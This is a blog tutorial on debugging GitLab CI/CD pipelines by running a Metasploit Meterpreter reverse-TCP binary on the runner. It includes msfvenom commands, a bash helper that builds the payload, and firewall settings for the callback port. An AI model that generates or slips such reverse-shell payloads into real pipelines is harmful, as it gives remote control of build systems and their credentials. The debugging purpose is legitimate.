#+title: Debug GitLab CI/CD Pipelines with Metasploit
#+Date: 2023-07-28
#+Draft: false
#+Tags[]: devops gitlab-ci gitlab metasploit
#+PROPERTY: header-args :eval never-export

Many individuals frequently encounter difficulties when troubleshooting their
pipelines. Often, the common approach to debugging these pipelines involves
employing a trial and error methodology. However, a superior solution exists
that is both more sophisticated and efficient.

By injecting code between the commands one wishes to troubleshoot, and then
having full environment access along with the tools required to perform tests
and analysis represents the ideal scenario. Considering the requirements:

  - Direct connection to the runner instance is not always possible, so the
    runner must connect to your server.
  - Runners can be executed inside a cluster (Kubernetes, Docker Swarm, AWS
    ECS, etc.), so the tool and connection method must accommodate this.
  - The injected binary must have the minimum amount of dependencies possible,
    requiring no further setup.
  - The binary must include tooling to facilitate the troubleshooting process,
    such as tools for downloading, uploading and manipulating files,
    troubleshooting network connections and connectivity issues, and handling
    processes.

This concept can be reused with other CI/CD tools, such as GitHub Actions,
Travis CI, and Jenkins.

* Generate a Meterpreter payload
The first step in this demonstration is to generate the binary payload to be
used. Once Metasploit is installed, simply run:

#+begin_src bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > meterpreter.elf
#+end_src

To facilitate the process, on systems with multiple network cards, it is
common for the first one to be a =loopback= interface. The bash function below
gets the first IP address after the =loopback= interface:

#+begin_src bash
function msfvenom-linux-meterpreter-default() {
    local LHOST="${1:-$(ip addr show | grep -o "inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | head -2 | tail -1)}"
    local LPORT="${2:-4444}"
    echo "[+] Creating a reverse connect meterpreter payload for ${LHOST}:${LPORT}"
    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf > meterpreter.elf
    echo "[+] Result saved to meterpreter.elf"
}
#+end_src

Nothing more is required to create a Meterpreter binary. If you run the
function =msfvenom-linux-meterpreter-default= without any parameter, the first
network interface after =loopback= will be used, or you can specify the IP
address which the Meterpreter payload will use as the first parameter. The
second parameter is the port to which it will connect; the default is =4444= if
no port is set.

We can easily check if the resulting binary is statically linked:

#+begin_src bash :results verbatim
ldd ../../meterprefer.elf
#+end_src

#+RESULTS:
: 	statically linked

Other networking aspects should also be taken into consideration. In case you
are behind a firewall, opening the respective ports and configuring proper
forwarding is required. If you are using =NixOS=, you will need to setup your
local firewall as follows:

#+begin_src nix
networking.firewall = {
  enable = true;
  allowedTCPPorts = [ 4444 ];
};
#+end_src

